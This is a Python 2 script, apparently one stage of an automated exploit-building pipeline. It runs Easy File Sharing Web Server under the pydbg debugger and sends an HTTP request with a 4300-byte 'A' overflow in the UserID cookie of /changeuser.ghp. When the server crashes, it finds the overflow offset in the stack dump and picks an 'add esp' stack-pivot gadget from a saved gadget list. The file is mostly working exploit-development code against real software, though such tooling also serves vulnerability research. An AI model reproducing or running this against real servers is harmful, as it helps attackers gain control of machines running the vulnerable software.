# -*- coding: utf-8 -*-
import time
import sys
import socket
import cPickle
import os

from pydbg import *
from pydbg.defines import *

from util import *

GADGET_PICKLE = "gadgets.pkl"
LAST_PICKLE_NAME = "crash_info.pkl"
PICKLE_NAME = "stackpivot.pkl"

exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"

import threading
import time

host, port = "127.0.0.1", 80

global Running
global lock
global chance
global MAX_OFFSET
global OFFSET

chance = 2
Running = True
lock = threading.Lock()

def find_stackpivot(stack):
	overflow = 0
	start_offset = 0
	start_value = ""
	for depth, value in stack:
		if value == "0x41414141":
			overflow += 1
		else:
			overflow = 0
		if overflow == 0:
			start_offset, start_value = depth, value
		if overflow == 10:
			deep = int("0x"+depth.split("+")[-1], base=16) - 4*9
			# start_offset = int("0x"+start_offset.split("+")[-1], base=16) - 4*9
			if start_value.startswith("0x414141"):
				fix = 3
			elif start_value.startswith("0x4141"):
				fix = 2
			elif start_value.startswith("0x41"):
				fix = 1
			else:
				fix = 0
			# print "find", deep, fix
			return deep, fix

def check_access_validation(dbg):
	global chance
	global Running
	global lock

	with lock:
		if dbg.dbg.u.Exception.dwFirstChance:
			chance -= 1
			# prevent test next size.
			Running = False
			if chance==0:
				Running = False
				crash_info = dbg.dump_context_list(stack_depth=OFFSET/4)
				stack_info = []

				for a in xrange(0, OFFSET, 4):
					key = "esp+0" + hex(a)[2:] if len(hex(a))<4 else "esp+" + hex(a)[2:]
					stack_info.append((key, hex(crash_info[key]["value"])))

				deep, fix = find_stackpivot(stack_info)
				move_up_list = []
				with open(GADGET_PICKLE, "rb") as local_file:
					gadgets = cPickle.load(local_file)
					for addr, insturctions in gadgets["addnum"].items():
						if insturctions.startswith("add esp,") and insturctions.find("pop") == -1:
							move_up = int(insturctions.split(" ; ")[0].split(",")[1].strip(), base=16)
							if move_up>=deep:
								move_up_list.append((addr, insturctions, deep))

				select_moveup = None
				for g in move_up_list:
					if select_moveup is None or select_moveup[2]>g[2]:
						select_moveup = g
				# print select_moveup

				with open(PICKLE_NAME, "wb") as local_file:
					cPickle.dump({select_moveup[0] : select_moveup[1]}, local_file)
					cPickle.dump(select_moveup[2], local_file)
					cPickle.dump(fix, local_file)

				# print dbg.dump_context(stack_depth=1000)
				dbg.terminate_process()
				return DBG_EXCEPTION_NOT_HANDLED
			else:
				Running = True
			return DBG_EXCEPTION_NOT_HANDLED

		return DBG_EXCEPTION_NOT_HANDLED

class Fuzzer(object):
	def __init__(self, exe_path, max_offset = 8000):
		self.exe_path = exe_path
		self.pid = None
		self.dbg = None
		# self.running = True
		
		self.dbgThread = threading.Thread(target=self.start_debugger)
		self.dbgThread.setDaemon(False)
		self.dbgThread.start()
		
		# Wait debugger start process
		while self.pid is None:
			time.sleep(1)
		
		self.monitorThread = threading.Thread(target=self.monitor_debugger)
		self.monitorThread.setDaemon(False)
		self.monitorThread.start()
			
	def monitor_debugger(self):
		global Running
		global OFFSET

		with open(LAST_PICKLE_NAME, "rb") as local_file:
			OFFSET = cPickle.load(local_file)
			seh_offset = cPickle.load(local_file)
			seh = cPickle.load(local_file)
			nseh = cPickle.load(local_file)

		raw_input("[+] Please start the debugger...")
		while  Running:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			buffer = "A" * 4300
			httpreq = (
				"GET /changeuser.ghp HTTP/1.1\r\n"
				"User-Agent: Mozilla/4.0\r\n"
				"Host:" + host + ":" + str(port) + "\r\n"
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
				"Accept-Language: en-us\r\n"
				"Accept-Encoding: gzip, deflate\r\n"
				"Referer: http://" + host + "/\r\n"
				"Cookie: SESSIONID=6771; UserID=" + buffer + "; PassWD=;\r\n"
				"Conection: Keep-Alive\r\n\r\n"
			)
			s.send(httpreq)
			s.close()
			Running = False
			
	'''
		Try to start debugger and run it.
	'''
	def start_debugger(self):
		try:
			self.dbg = pydbg()
			self.dbg.load(self.exe_path)
			self.pid = self.dbg.pid
		except pdx:
			print "[+] Can't open file, please check file path"
			sys.exit(1)
		except Exception as e:
			print "[+] Unknow error: ", str(e)
			sys.exit(1)

		self.dbg.set_callback(EXCEPTION_ACCESS_VIOLATION, check_access_validation)
		self.dbg.run()
		
exe_path = "D:\\testPoc\\Easy File Sharing Web Server\\fsws.exe"
Fuzzer(exe_path)